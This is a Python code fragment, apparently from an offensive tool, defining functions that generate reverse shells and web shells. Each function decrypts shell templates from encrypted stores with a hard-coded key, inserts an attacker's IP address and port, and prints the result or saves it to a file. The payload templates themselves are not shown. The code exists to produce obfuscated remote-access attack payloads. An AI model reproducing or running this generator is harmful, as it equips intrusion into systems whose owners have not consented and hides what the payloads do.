def genrev(ip, port, shell, opass=False, filename='none'):
	key = b'cgKYCLDLolQ44gkri7utosNIdjcYfgTh3OTrYKAxO2Q='
	fernet = Fernet(key)
	try:
		sh = fernet.decrypt(base64.b64decode(revshells[shell].encode())).decode().replace('^IP^', ip).replace('^PORT^', port)
	except KeyError:
		print (f'[\033[31m-\033[m] Shell not found!')
		return
	if opass is False:
		print (sh)
		return
	print (f'[\033[33mINFO\033[m] Reverse-Shell generated! Storing at: {filename}...')
	with open(filename, 'w') as f:
		f.write(sh)
	print (f'[\033[32m+\033[m] Reverse Shell successfully stored at \033[36m{filename}\033[m')
	return


def genweb(shell, opass=False, filename='none'):
	key = b'cgKYCLDLolQ44gkri7utosNIdjcYfgTh3OTrYKAxO2Q='
	fernet = Fernet(key)
	try:
		sh = fernet.decrypt(base64.b64decode(webshells[shell].encode())).decode()
	except KeyError:
		print (f'[\033[31m-\033[m] Shell not found!')
		return
	if opass is False:
		print (sh)
		return
	print (f'[\033[33mINFO\033[m] Web-Shell generated! Storing at: {filename}...')
	with open(filename, 'w') as f:
		f.write(sh)
	print (f'[\033[32m+\033[m] Reverse Shell successfully stored at \033[36m{filename}\033[m')
	return



